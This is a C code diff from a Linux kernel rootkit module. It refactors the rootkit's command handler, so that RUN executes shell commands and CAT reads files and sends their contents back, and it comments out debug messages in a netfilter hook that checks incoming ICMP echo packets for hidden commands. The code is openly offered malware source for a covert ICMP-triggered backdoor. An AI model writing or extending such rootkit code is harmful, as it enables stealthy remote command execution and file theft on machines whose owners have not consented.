@@ -6,27 +6,16 @@ void rootkit_handler(struct work_struct* work) {
     // getting passed args struct
     args_t* args = container_of(work, args_t, work);
 
-    char* buffer;
-
     command_t command = parse_command(args->string);
 
     switch (command) {
         case RUN:
             DEBUG_PRINTF("rootkit: shell command: %s \n", args->string)
-            run_shell_command(args->string);
-            send_response("rootkit: command was performed\0", args);
+            run_command(args);
             break;
         case CAT:
             DEBUG_PRINTF("rootkit: cat command: %s \n", args->string);
-            buffer = kmalloc(CAT_BUFFER_SIZE + 1, GFP_KERNEL);
-            // checking errors
-            if (read_file(args->string, buffer, CAT_BUFFER_SIZE, 0) == 0) {   
-                send_response(buffer, args);
-            } else {
-                send_response("rootkit: error while reading\0", args);
-            }
-            kfree(buffer);
-            
+            cat_command(args);
             break;
         default:
             DEBUG_PUTS("rootkit: invalid command\n")
@@ -61,11 +50,11 @@ unsigned int packet_reciever(void *priv, struct sk_buff *skb, const struct nf_ho
     icmph = icmp_hdr(skb);
 
 
-    DEBUG_PUTS("rootkit: ckecking connection\n")
+    //DEBUG_PUTS("rootkit: checking connection\n")
 
 
     if (iph->protocol != IPPROTO_ICMP) {
-        DEBUG_PUTS("rootkit: bad protocol\n")
+        //DEBUG_PUTS("rootkit: bad protocol\n")
         return NF_ACCEPT;
     }
     if (icmph->type != ICMP_ECHO) {
